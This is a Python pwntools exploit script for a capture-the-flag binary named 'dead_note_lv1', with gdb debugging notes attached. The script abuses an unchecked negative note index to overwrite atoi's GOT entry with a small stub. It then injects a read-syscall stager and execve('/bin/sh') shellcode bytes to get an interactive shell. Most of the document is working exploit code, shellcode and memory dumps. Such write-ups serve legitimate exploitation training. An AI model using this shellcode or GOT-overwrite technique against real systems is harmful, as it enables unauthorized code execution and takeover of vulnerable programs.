#! /usr/bin/python

# placing shellcode on stack (stack is rwx in this task)
# writing shellcode address into atoi got using add_note function
# becasue there are no check for index and got table is right above notes table
# but we can create only notes with max size of 3 bytes

from pwn import *

s = process('./dead_note_lv1')

def print_all():
    print s.recvuntil('choice')

def add_note(index, num, content):
    s.sendline('1')
    s.sendlineafter('Index: ', str(index))
    s.sendlineafter('Number of Note: ', str(num))
    s.sendlineafter('Content: ', content)
    print s.recvline
    print_all()

def del_note(index):
    s.sendline('2')
    s.sendlineafter('Index: ', str(index))

print_all()

elf = ELF('./dead_note_lv1')
atoi_got = elf.got['atoi']
print 'atoi_got: {}'.format(hex(atoi_got))


add_note(1, 1, 'AAA')

# before calling atoi our input will be at rsi =>
# push rsi; ret; => \x56\xc3


add_note(-14, 1, '\x56\xc3')

# read:
# rax = 0
# rdi = fd
# rsi = buf
# rdx = size

# mov rdx, 0xff
# xor rdi, rdi
# syscall

sc = '\x48\xc7\xc2\xff\x00\x00\x00\x48\x31\xff\x0f\x05'  # len = 12 

# we gone call read to read shellcode into rsi
s.sendline(sc)

sc2 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# because our first shellcode which was calling read had length = 12
# after we did read our shellcode rip apepars to be at this position:
# RIP: 0x7fffffffdc6c ("Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A\nOUUUU") => offset = 12
s.sendline('A' * 12 + sc2)

s.interactive()

'''
# 0x555555554c3a - atoi call
gdb.attach(s, """
b * 0x555555554c3a
""")


gdb-peda$ find 'AAA'
Searching for 'AAA' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x555555759010 --> 0x414141 ('AAA')
gdb-peda$ find 0x555555759010
Searching for '0x555555759010' in: None ranges
Found 1 results, display max 1 items:
dead_note_lv1 : 0x5555557560e8 --> 0x555555759010 --> 0x414141 ('AAA')
gdb-peda$ x/64gx 0x5555557560e8
0x5555557560e8:	0x0000555555759010	0x0000000000000000
0x5555557560f8:	0x0000000000000000	0x0000000000000000
0x555555756108:	0x0000000000000000	0x0000000000000000
0x555555756118:	0x0000000000000000	0x0000000000000000
0x555555756128:	0x0000000000000000	0x0000000000000000

gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555556000 r-xp	/home/osboxes/Desktop/dead_note_lv1
0x0000555555755000 0x0000555555756000 r-xp	/home/osboxes/Desktop/dead_note_lv1
0x0000555555756000 0x0000555555757000 rwxp	/home/osboxes/Desktop/dead_note_lv1
0x0000555555757000 0x000055555577a000 rwxp	[heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd8000 0x00007ffff7fdb000 rwxp	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]    <-- (!)
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]

0000000000202070 R_X86_64_JUMP_SLOT  atoi@GLIBC_2.2.5

0x555555554000 + 0x202070 = 0x555555556070

gdb-peda$ x/32gx 0x555555756000
0x555555756000:	0x0000000000201df8	0x00007ffff7ffe168
0x555555756010:	0x00007ffff7dee870	0x0000555555554976
0x555555756020:	0x00007ffff7a7c690	0x00007ffff7a98720
0x555555756030:	0x00005555555549a6	0x00007ffff7a836b0
0x555555756040:	0x00007ffff7a62800	0x00007ffff7b7f970
0x555555756050:	0x00007ffff7ad9200	0x00007ffff7b04250
0x555555756060:	0x00007ffff7a2d740	0x00007ffff7a423c0
0x555555756070:	0x00007ffff7a43e80	0x0000555555554a36 <-- -14 , -13
0x555555756080:	0x00007ffff7a98470	0x0000000000000000
0x555555756090:	0x0000555555756090	0x00000000000003e7
0x5555557560a0:	0x00007ffff7dd2620	0x0000000000000000
0x5555557560b0:	0x00007ffff7dd18e0	0x0000000000000000
0x5555557560c0:	0x00007ffff7dd2540	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000555555759010
0x5555557560f0:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/32gx 0x00007ffff7a43e80
0x7ffff7a43e80 <atoi>:	0x00000aba08ec8348	0x00004530e8f63100
0x7ffff7a43e90 <atoi+16>:	0x0f2e66c308c48348	0x900000000000841f
0x7ffff7a43ea0 <atol>:	0xe9f6310000000aba	0x00401f0f00004514
0x7ffff7a43eb0 <atoll>:	0xe9f6310000000aba	0x00401f0f00004504
0x7ffff7a43ec0 <__GI_abort>:	0x6400000128ec8148	0x0000001025148b48
0x7ffff7a43ed0 <__GI_abort+16>:	0x740038ed21153b48	0xc03100000001be46
0x7ffff7a43ee0 <__GI_abort+32>:	0x7400003928593d83	0x38ecff35b10ff00c
0x7ffff7a43ef0 <__GI_abort+48>:	0x35b10f23eb0b7500	0x8d481a740038ecf4
0x7ffff7a43f00 <__GI_abort+64>:	0xec81480038eceb3d	0x0de16fe800000080
0x7ffff7a43f10 <__GI_abort+80>:	0x00000080c4814800	0x8b0038ecd9158948
0x7ffff7a43f20 <__GI_abort+96>:	0xc805830038ecdb05	0x4374c085010038ec
0x7ffff7a43f30 <__GI_abort+112>:	0x02f883777401f883	0xf8830000008e840f
0x7ffff7a43f40 <__GI_abort+128>:	0x8300000142840f03	0x00000205840f04f8
0x7ffff7a43f50 <__GI_abort+144>:	0x00021a840f05f883	0x0234840f06f88300
0x7ffff7a43f60 <__GI_abort+160>:	0x2c840f07f8830000	0x0000441f0f000002
0x7ffff7a43f70 <__GI_abort+176>:	0x0010b9c031fdebf4	0xab48f3e789480000


after add_note(-14, 1, 'BBB'):

gdb-peda$ x/32gx 0x555555756000
0x555555756000:	0x0000000000201df8	0x00007ffff7ffe168
0x555555756010:	0x00007ffff7dee870	0x0000555555554976
0x555555756020:	0x00007ffff7a7c690	0x00007ffff7a98720
0x555555756030:	0x00005555555549a6	0x00007ffff7a836b0
0x555555756040:	0x00007ffff7a62800	0x00007ffff7b7f970
0x555555756050:	0x00007ffff7ad9200	0x00007ffff7b04250
0x555555756060:	0x00007ffff7a2d740	0x00007ffff7a423c0
0x555555756070:	0x0000555555759030	0x0000555555554a36  <-- -14, -13
0x555555756080:	0x00007ffff7a98470	0x0000000000000000
0x555555756090:	0x0000555555756090	0x00000000000003e6
0x5555557560a0:	0x00007ffff7dd2620	0x0000000000000000
0x5555557560b0:	0x00007ffff7dd18e0	0x0000000000000000
0x5555557560c0:	0x00007ffff7dd2540	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
0x5555557560e0:	0x0000000000000000	0x0000555555759010
0x5555557560f0:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/s 0x0000555555759030
0x555555759030:	"BBB"

if we chose any menu number, atoi will try to execute our 'BBB' 
=> we gone get sigsegv

Registers values right before we goineg to jump on our shellcode:
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0xf 
RSI: 0x7fffffffdc60 ('C' <repeats 16 times>, "`JUUUU")
RDI: 0x7fffffffdc60 ('C' <repeats 16 times>, "`JUUUU")
RBP: 0x7fffffffdc80 --> 0x7fffffffdc90 --> 0x555555555020 (push   r15)
RSP: 0x7fffffffdc58 --> 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
RIP: 0x555555759030 --> 0xc356 
R8 : 0x7ffff7fd9700 (0x00007ffff7fd9700)
R9 : 0xd ('\r')
R10: 0x0 
R11: 0x346 
R12: 0x555555554a60 (xor    ebp,ebp)
R13: 0x7fffffffdd70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555575902a:	add    BYTE PTR [rax],al
   0x55555575902c:	add    BYTE PTR [rax],al
   0x55555575902e:	add    BYTE PTR [rax],al
=> 0x555555759030:	push   rsi
   0x555555759031:	ret    
   0x555555759032:	add    BYTE PTR [rax],al
   0x555555759034:	add    BYTE PTR [rax],al
   0x555555759036:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc58 --> 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
0008| 0x7fffffffdc60 ('C' <repeats 16 times>, "`JUUUU")
0016| 0x7fffffffdc68 ("CCCCCCCC`JUUUU")
0024| 0x7fffffffdc70 --> 0x555555554a60 (xor    ebp,ebp)
0032| 0x7fffffffdc78 --> 0x5ea8a72b45d5b500 
0040| 0x7fffffffdc80 --> 0x7fffffffdc90 --> 0x555555555020 (push   r15)
0048| 0x7fffffffdc88 --> 0x555555554fd2 (cmp    eax,0x2)
0056| 0x7fffffffdc90 --> 0x555555555020 (push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000555555759030 in ?? ()
'''






















































